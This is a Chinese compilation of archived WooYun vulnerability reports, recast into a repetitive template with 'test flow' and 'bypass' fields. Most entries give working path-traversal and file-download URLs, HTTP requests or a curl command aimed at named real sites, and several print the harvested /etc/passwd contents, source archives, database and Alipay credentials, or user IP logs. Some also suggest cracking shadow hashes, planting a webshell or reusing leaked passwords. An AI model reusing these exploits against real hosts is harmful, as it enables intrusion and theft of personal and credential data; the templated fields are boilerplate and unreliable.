**厂商**: 奇艺 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://220.181.184.125问题：全目录遍历，各种程序源代码压缩包(还有开源程序压缩包)，各种平台、测试环境集一身

**POC**: 先说怎么证明是“爱奇艺”的服务器呢，这样来下载这个程序的源码：地址：http://220.181.184.125/kohana.tomsui.tar.gz这个文件：/kohana.tomsui/kohana/application/classes/Controller/Orm.php然后看这里：$user->email = 'suixiaodong2@qiyi.com';$user->username = 'tomsui2';$user->password = '123456';有些程序源码里存在mysql账号、密码，呵呵接着上个源码文件/kohana.tomsui/kohana/applic

**绕过**: 直接利用

**修复**: 困了，该睡觉了
---

---
### [wooyun-2011-02296] 电信任意文件下载漏洞
**厂商**: 福建电信 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.fj.ct10000.com/bnf10000/view/download/down.jsp?path=/../../etc/&filename=passwd

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-0160005] 中软终端安全管理系统文件下载漏洞（一键下载整个网站）
**厂商**: cert | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 源于这个漏洞http://**.**.**.**/bugs/wooyun-2015-0159690直接把题目的关键字(中软统一终端安全管理系统)丢到傻蛋，如图查看源代码，很明显的任意文件下载漏洞../Picture?imagePath=漏洞证明：curl **.**.**.**:8080/Picture?imagePath=../server/default/deploy/ROOT.war > root.rarroot.rar整个网站的代码就这样被下载下来了..附上几个案例：**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8443/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.*

**POC**: curl **.**.**.**:8080/Picture?imagePath=../server/default/deploy/ROOT.war > root.rar

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0157180] 长安汽车某系统存在任意文件下载漏洞
**厂商**: 长安汽车 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/live800/downlog.jsp?path=/&fileName=/etc/passwd

**POC**: http://**.**.**.**/live800/downlog.jsp?path=/&fileName=/etc/hosts

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2013-039169] HTC S720e存在系统目录遍历漏洞
**厂商**: HTC | **年份**: 2013 | **类型**: 用户敏感数据泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户敏感数据泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户敏感数据泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: HTC S720e手机上的com.htc.calendar存在provider调用openFile，存在目录遍历漏洞，通过构造content://com.htc.calendar/../../../../../即可访问到根目录下的可以对外访问的所有文件。Uri uri = Uri.parse("content://com.htc.calendar/../../../../../system/etc/hosts");//Uri uri = Uri.parse("content://com.htc.calendar/../../../../../data/data/com.htc.calendar/shared_prefs/com.htc.calendar_preferences.xml");ContentResolver cr = getContentResolver();

**POC**: 通过构造content://com.htc.calendar/../../../../../即可访问到根目录下的可以对外访问的所有文件。

**绕过**: 直接利用

**修复**: 对provider的openFile要做下限制，防止../..
---

---
### [wooyun-2012-07105] 国家司法考试某服务平台任意文件下载
**厂商**: 云南国家司法考试办公室 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://www.gjsk.yn.gov.cn/yunnanlawexam/download.jsp?filepath=D:%5CTomcat-5.5.16%5Cwebapps%5Cyunnanlawexam%5Cweb_manager/infocenter/annexfiles/IC04000000083.doc其中文件下载路径参数filepath没有对路径进行必要的限制！另：下载路径直接暴漏了网站的物理路径！

**POC**: http://www.gjsk.yn.gov.cn/yunnanlawexam/download.jsp?filepath=D:%5CTomcat-5.5.16%5Cwebapps%5Cyunnanlawexam%5Cdownload.jsphttp://www.gjsk.yn.gov.cn/yunnanlawexam/download.jsp?filepath=D:%5CTomcat-5.5.16%5Cconf/server.xml.........and so on!

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2015-0134837] 链家自如网某站存在LFI本地任意文件读取漏洞
**厂商**: homelink.com.cn | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://price.ziroom.com/?_p=../../../../../../../../../../

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-060301] 北京观滔宽带商城数据库备份文件泄露
**厂商**: 观滔科技 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今两天晚上继续逛了逛观滔的商城 shop.gtao.com发现了目录遍历，无意中找到了2013年他们的数据库备份文件数据库拿到以后，社工的话，对于这些没改密码的用户实在是后患无穷啊~

**POC**: 今两天晚上继续逛了逛观滔的商城，上传了张图片然后顺手看了下这个地址，http://shop.gtao.com/data/目录遍历，配置的时候也太不小心了吧。sqldata.rar 好吧，谁让我也是观滔用户呢，下载看看吧。数据还挺多，就不仔细看了吧。但是gt_users这些就是我们用户相关的数据了。都是简单的MD5，网上随便解密几个试试。就能登录了。再换个用户。如果登陆了有余额的用户，可以购买东西。（这是犯法哦，小心查水表，好孩子千万不要尝试）写在最后，许多人都有一个特点，就是各种网站都用同一个密码。所以这个库如果用来社工，大家想一想，里面有好多的QQ和密码，还有手机号，可以尝试登录QQ还有各种

**绕过**: 直接利用

**修复**: 目录遍历没啥好说的了敏感信息一类的，还是备份到别的地方吧最后。。。求运营商观滔免宽带费
---

---
### [wooyun-2015-0115645] MSA互联网管理网关另一处任意文件遍历下载（无需登录）
**厂商**: 上海宝创信息科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: MSA互联网管理网关任意文件遍历下载（无需登录）根据上面报告发现漏报了一处。由于没充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。无需登录情况任意遍历系统文件下载（以/etc/passwd文件为例）案例：https://61.177.62.254/https://211.70.1.45/https://222.139.212.52/https://222.92.137.74/https://59.61.234.109/https://122.227.166.27/https://123.13.224.247/https://222.85.76.112/https://221.176.165.214/https://122.227.166.26/https://117.32.249.196/https://61.175.13

**POC**: GET /msa/../../../../etc/passwd HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Accept-Encoding: gzip, deflateHost: 61.175.134.133Connection: Keep-Alive

**绕过**: 直接利用

**修复**: 联系厂商
---

---
### [wooyun-2013-016995] 方正证券任意文件下载
**厂商**: 方正证券 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.foundersc.com/wzweb/common/downloadAtt.action?attPath=../../../../../etc/passwd&infId=17488390&attType=application/txt&attNm=passwd&ei=VCnpUMG0E4iZkAXuoIGYBg&usg=AFQjCNGp4L_piA3IlzLFDXd0Yp-XceNFrg

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-069223] 某质监站系统存在SQL注射+任意文件下载漏洞
**厂商**: 国家互联网应急中心 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商：技术支持：绍兴深蓝软件开发有限公司搜索：https://www.google.com/search?newwindow=1&noj=1&biw=1024&bih=677&q=inurl%3Axxcontent.jsp%3Frowid&oq=inurl%3Axxcontent.jsp%3Frowid&gs_l=serp.3...7362.7362.0.7987.1.1.0.0.0.0.187.187.0j1.1.0....0...1c.1.49.serp..1.0.0.ZpMjnFhtfmU

**POC**: 【声明以下案例均供CNVD、CNCERT测试，其它人不得利用或者恶意破坏，否则后果自负】A:注入漏洞注入点：xxcontent.jsp?rowid=测试一下啦~http://n****z.com/xxcontent.jsp?rowid=149http://www.s****x.com/xxcontent.jsp?rowid=187http://2**.***.**.10/wz/xxcontent.jsp?rowid=2173http://www.p*z*z.cn/xxcontent.jsp?rowid=73最后证明可跑出数据，这里仅仅列库名来证明。B：任意文件下载漏洞缺陷文件：download

**绕过**: 直接利用

**修复**: 点到为止，请国家互联网应急中心下发分中心处置吧
---

---
### [wooyun-2014-058891] 联通某集成CMS系统存在任意文件下载漏洞
**厂商**: 联通系统集成有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这回这cms不知名，官网是si.cnc.cn。貌似该类软件大部分都是windows搭建的。先丢一个实例：http://www.qingdaoagri.gov.cn/qd_agri_web/siteweb/wsbs/jsdh/download.jsp?path=C:windows/win.ini直接把win.ini 给download回来了; for 16-bit app support[fonts][extensions][mci extensions][files][Mail]MAPI=1CMCDLLNAME32=mapi32.dllCMC=1MAPIX=1MAPIXVER=1.0.0.1OLEMessaging=1system.ini:; for 16-bit app support[386Enh]woafont=dosapp.fonEGA80WOA.FON=EGA80WOA.FONE

**POC**: http://www.yanzhou.gov.cn/siteweb/wsbs/jsdh/download.jsp?path=C:windows/win.inihttp://www.xintai.gov.cn/siteweb/wsbs/jsdh/download.jsp?path=C:windows/win.inihttp://221.214.219.38/siteweb/wsbs/jsdh/download.jsp?path=C:windows/win.inihttp://www.sdyt.gov.cn/siteweb/wsbs/jsdh/download.jsp?path=C:windows

**绕过**: 直接利用

**修复**: path路径不要让用户可控。
---

---
### [wooyun-2014-082761] 国泰君安研究管理系统任意文件下载
**厂商**: 国泰君安 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在对研究管理系统的检测过程中，发现用户在登录系统后，可以访问系统的下载功能，但是由于下载功能程序没有对用户输入字符进行限制，用户可以通过在参数中加入父目录字符跳出程序默认的文件路径，下载到其他目录中的文件，造成了程序源码泄漏或者其他安全问题。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 建议修改下载功能程序，防止用户跳出系统指定目录。
---

---
### [wooyun-2014-073335] 中移物联网公司文件下载可获取系统敏感信息
**厂商**: 中国移动 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在物联网官网的二维码产品体验中，随便制了个码图。http://218.206.24.135:81/iot/download?fn=../../../../../etc/passwd感觉方便啊，可以整个logo，还可以保存码图，突然想看看这里有没有问题呢？打开burp，发现下载链接很简单，手贱试了下看能不能获取passwd文件呢？不说了，上图：还是验证下fn吧。

**POC**: 在物联网官网的二维码产品体验中，随便制了个码图。感觉方便啊，可以整个logo，还可以保存码图，突然想看看这里有没有问题呢？打开burp，发现下载链接很简单，手贱试了下看能不能获取passwd文件呢？不说了，上图：还是验证下fn吧。

**绕过**: 直接利用

**修复**: 可以对下载的文件名进行正则校验当然你们是高手
---

---
### [wooyun-2014-057171] 如家酒店Android客户端程序支付漏洞进敏感信息泄漏
**厂商**: 如家酒店集团 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.掌上如家App集成了支付宝支付功能，支付所需的商家ID，商户签名私钥都硬编码在代码中并且直接是明文public class PartnerConfig{public static final String ALIPAY_PLUGIN_NAME = "alipay_plugin_20120428msp.apk";public static final String PARTNER = "2088011831474463";public static final String RSA_ALIPAY_PUBLIC = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDjYGtHCa4IUMruec0EElEwnqRb0XP2MlcUNQuT ptuUP+7DB6o4kZn70wNFYD/sdt3ovsc9JeAVbVgRxYo3E+oYqoBuxOvGLDKWo

**POC**: 1.对于漏洞1，可以利用的途径是篡改商户ID和私钥，改成攻击者在支付宝上注册的商户ID和私钥，从而将现金转入攻击者账号，但未论证攻击。但是在支付宝提供的Demo代码中，将商户ID和私钥设置为如家的，金额正常转入到如家支付宝账号。2.对于漏洞2，通过反编译App并且修改支付金额参数传入的相关代码，并且重打包应用。安装到手机后，证实该漏洞可以利用public void onClick(View paramView){if ((isAlipay) || (isHomeInnPay)){if (paramView.getId() == 2131034246)getActivity().getInten

**绕过**: 编码绕过

**修复**: 漏洞修复建议：1.对掌上如家客户端的代码进行混淆，加大逆向分析难度；2.支付宝支付参数不要硬编码，支付订单的签名功能可以放在服务器端完成；3.对客户端程序进行安全加固，启动时检测应用是否被重打包4.Web服务器进行安全配置，拒绝目录遍历
---

---
### [wooyun-2015-0119002] 华夏基金主站任意文件读取漏洞（可读取服务器敏感文件内容）
**厂商**: 华夏基金 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 参数注入

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL:http://www.chinaamc.com:80/portal/en/second.jspPOST参数：button=Get%20NAVs&categoty_link_nav=xxxxxxxx&column=ROOT>en>Investment%20Products>ABF%20China%20Bond%20Index%20Fund>Fund%20Unit%20NAV%20(Class%20A)&columnId=1302845853100&flg=1&fromDate=01/01/1967&link_page=/portal/en/second.jsp&minisite_column=ROOT>en>Investment%20Products>ABF%20China%20Bond%20Index%20Fund>Fund%20Unit%20NAV%20(Class%20A)&m

**POC**: 如上

**绕过**: 直接利用

**修复**: 过滤特殊字符../
---

---
### [wooyun-2012-09932] 南宁政府相关网站配置不当，目录遍历，信息泄露等
**厂商**: 南宁政府相关网站 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 能访问的呀！其他的就不截图了，只是需要重视一下，挂马什么的我也不会-0-！

**POC**: google之

**绕过**: 直接利用

**修复**: 重视安全 才是硬道理
---

---
### [wooyun-2016-0193082] 某市财政局任意文件下载导致敏感信息泄露
**厂商**: 某市财政 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/view/download?path=../../conf/tomcat-users.xml<?xml version='1.0' encoding='cp936'?><!--Licensed to the Apache Software Foundation (ASF) under one or morecontributor license agreements.  See the NOTICE file distributed withthis work for additional information regarding copyright ownership.The ASF licenses this file to You under the Apache License, Version 2.0(the "License"); you may no

**POC**: 直接部署war即可获取WebShell

**绕过**: 直接利用

**修复**: 加强安全意识
---

---
### [wooyun-2014-070485] 哈尔滨工程大学某分站任意文件下载
**厂商**: 哈尔滨工程大学 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 遍历目录漏洞可直接下载服务器文件，包括etc目录，我测试了password和shadow文件，然后别的你如果有耐心，慢慢猜一下名字，就可以下载，并且这里的服务器开了ssh

**POC**: 地址：jw.hrbeu.edu.cn/ACTIONSHOWINFO.APPPROCESS?fileName=../../../../../../../../../../etc/shadow&info=7710&mode=2文件地址那个地方可以随你喜好改服务器开了ssh服务，默认端口22，又有shadow可以去跑密码了别的文件可以试探下载，不知道会不会试到数据库？举例jw.hrbeu.edu.cn/ACTIONSHOWINFO.APPPROCESS?fileName=../../../../../../../../../../etc/issue&info=7710&mode=2查看版本信息吧

**绕过**: 直接利用

**修复**: 升级一下服务器软件吧，很老了
---

---
### [wooyun-2016-0207670] 上海热线邮箱系统任意文件读取漏洞
**厂商**: 上海热线 | **年份**: 2016 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/cloudmail/ 邮箱系统存在zimbra文件包含，很久远的漏洞了，读passwd文件为例http://**.**.**.**/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00

**POC**: 读取hosts文件http://**.**.**.**/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/hosts%00

**绕过**: 直接利用

**修复**: 升级
---

---
### [wooyun-2012-08320] 正方教务管理系统敏感记录文件下载
**厂商**: 杭州正方软件股份有限公司 | **年份**: 2012 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 正方教务管理系统默认会在log目录下每天生成txt格式的用户操作日志文件。以今天为例文件名为2012-06-14-log.txt，2012-06-14-ErrorLog.txt。由于校园网内使用私有地址和静态分配地址的学校占多数，在选课期间搜集少数记录文件就能建立比较完整的学号-ip映射表，配合该系统的其他漏洞，对个人隐私的危害不可忽视。

**POC**: 直接下载地址 http://jwc.****.edu.cn/log/2012-06-14-log.txthttp://jwc.****.edu.cn/log/2012-06-14-ErrorLog.txt记录的操作记录有如下敏感信息2012-6-14 1:14:23  用户:20100201143 ip:218.192.118.43执行页面：/lw_xscj.aspx执行模块内容：用户操作跳转页面：页面指向lw_xscj.aspx2012-6-14 1:14:23  用户:20100201143 ip:218.192.118.43执行页面：/lw_xscj.aspx执行模块内容：用户操作跳转页

**绕过**: 直接利用

**修复**: 禁止该目录里的文件被下载
---

---
### [wooyun-2012-04558] 新浪房产任意文件下载漏洞
**厂商**: 新浪 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://supports.house.sina.com.cn/decor/stylephoto/photo_save.php?name=123&url=/etc/passwd

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-060021] 华图教育分站存在任意文件读取漏洞
**厂商**: 华图教育 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://tiku.huatu.com/index.php?act=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

**POC**: http://tiku.huatu.com/index.php?act=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..//etc/hosts

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-069299] 21cn大礼包2
**厂商**: 世纪龙信息网络有限责任公司 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 后台管理

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历源码泄漏http://121.14.133.28:8082/任意读取http://121.14.133.28:8090//resin-doc/viewfile/?contextpath=/&servletpath=&file=index.jsphttp://121.14.133.46:9000/resin-doc/viewfile/?contextpath=/&servletpath=&file=index.jsphttp://121.14.133.43:9000/这个后台没有验证码可爆破,我没有合适的牛逼的字典就不献丑了.

**POC**: 如上证明

**绕过**: 直接利用

**修复**: 删.
---

---
### [wooyun-2013-041455] 深圳航空某系统列目录导致源码及信息泄漏
**厂商**: 深圳航空 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于服务器开启了webdav方法，可以先列下目录发现有两个rar文件下载web091022.rar源码包查看其他目录http://219.134.93.143/crmvermgr/http://219.134.93.143/crystalreportviewers10/http://crm.shenzhenair.com/crmupdownload/

**POC**: 如上

**绕过**: 直接利用

**修复**: web服务器做下配置
---

---
### [wooyun-2015-0123509] 爱内测任意用户密码重置/绝对路径泄露/目录遍历
**厂商**: 爱内测 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 爱内测：http://www.ineice.com/1、绝对路径泄露上传app后，会返回上传后apk存储的绝对路径，并且会返回一个子域名回来，这个子域名存在目录遍历漏洞：2、目录遍历：http://fs.ineice.com/detect/icon/这又牵扯出另一个问题，通过组合访问返回绝对路径信息，可直接下载apk：这个apk后面的目录名可通过第2点中的目录遍历漏洞获取到，文件名是时间戳+3位随机数，时间戳可通过目录遍历获取到的目录名前面的时间获取到（好像有个时间差，在20秒左右），3位随机数就爆破都可以了，所以要想下载的话，还是很简单的，只不过...然并卵3、任意用户密码重置 --- 方法1在页面修改密码的地方：当前密码任意填，然后输入新密码，在提交的时候使用burpsuite拦截请求，并且中断应答，然后将第一次应答回来的result值改为1（当前密码校验错误返回的是0），拦截请求，将

**POC**: 看详细说明：

**绕过**: 直接利用

**修复**: 逻辑还可以再严谨点
---

---
### [wooyun-2012-07569] 新浪某分站目录遍历
**厂商**: 新浪 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 子站club.show.sina.com.cn server配置不当导致任意目录遍历看图：http://club.show.sina.com.cn/admin/

**POC**: 安装目录怎么能不删除呢！http://club.show.sina.com.cn/install/module/step_1.php

**绕过**: 直接利用

**修复**: 貌似是nginx，开启了autoindex
---

---
### [wooyun-2013-040534] 美的#某管理系统敏感文件下载及目录遍历漏洞
**厂商**: midea.com | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题分站：http://pcm.welling.com.cn:7001/问题链接：http://pcm.welling.com.cn:7001/web/plug-in/dl.jsp?fileName=item_cost_and_fee.doc&filePath=../../../../../../../../../../etc/passwd%00.docroot:x:0:0:Super-User:/:/sbin/shdaemon:x:1:1::/:bin:x:2:2::/usr/bin:sys:x:3:3::/:adm:x:4:4:Admin:/var/adm:lp:x:71:8:Line Printer Admin:/usr/spool/lp:uucp:x:5:5:uucp Admin:/usr/lib/uucp:nuucp:x:9:9:uucp Admin:/var/spool/uuc

**POC**: 已经证明

**绕过**: 直接利用

**修复**: 0x1：加强权限控制
---

---
### [wooyun-2014-047707] 百度某系统源码及多个数据库密码泄露
**厂商**: 百度 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 服务器地址：http://61.135.185.214/配置不当，目录遍历。atm-256.tar.gz          12-Nov-2013 20:12   72M下载下来看一下，原来是RMS系统的源码文件通过对下载文件的查看，发现其为内部开发系统，涉及的东西比较多还有机房管理系统文件#多个数据库密码泄露atm-256\atm-256\protected\config\conf.php<?php// ============== 线上环境 ===============//if(RMS_ENV == 'prod') {$homeUrl = "http://rms.baidu.com";$svp_hostname = "sys.baidu.com";$svp_login_url = "{$homeUrl}/?r=login/checkAuthenticated";$svp_logout

**POC**: 如上

**绕过**: 直接利用

**修复**: 更改服务器配置
---

---
### [wooyun-2015-0158283] 开源证券邮件系统设计缺陷可暴力破解
**厂商**: 开源证券股份有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 开源证券邮件系统虽然存在验证码但是未起到作用导致可以暴力破解http://mail.kysec.cn01 首先获取一枚弱口令wanghaiyan/123456,登录后需要修改密码才能查看收件箱，密码已修改为123456abc02 系统通讯组、公用地址簿泄漏所有邮件地址，发现无法批量导出，则可以利用burp以pag（页码）为参数跑出所有页面response,然后用脚本获取response中的所有邮件地址，如图：获取所有邮件地址的脚本，python太菜随便写的；# -*- coding: utf-8 -*-import refile_one=open('kysec.txt','r')          #原始的responsefile_two=open('kysec_mails.txt','w')    #提取的未去重的emailfile_end=open('mails.txt','w')  

**POC**: 因为密码都为123456，登录后必须修改密码，为了不影响用户，只修改了2个用户，密码修改为了123456abc,其他用户未修改；242	liuchuangfeng	200	false	false	2220470	wanghaiyan	200	false	false	22144、邮件系统密码策略存在问题，修改密码修改为123456abc显示为强密码；

**绕过**: 直接利用

**修复**: 你们更懂。测试用的邮件地址已删除；
---

---
### [wooyun-2016-0213018] 财达证券某系统存在任意文件下载漏洞
**厂商**: 财达证券有限责任公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://im.cdzq.com:9901/PersonalPortal/download.jsp?filePath=https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/b4629ba2-b587-4eb9-85d8-8d87426ca796/../../WEB-INF/web.xml&fileName=web.xml

**POC**: http://im.cdzq.com:9901/PersonalPortal/download.jsp?filePath=https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/b4629ba2-b587-4eb9-85d8-8d87426ca796/../../WEB-INF/struts-config.xml&fileName=1.txthttp://im.cdzq.com:9901/PersonalPortal/download.jsp?filePath=https://wooyun-img.oss-cn-beijing.aliyunc

**绕过**: 直接利用

**修复**: 过滤
---
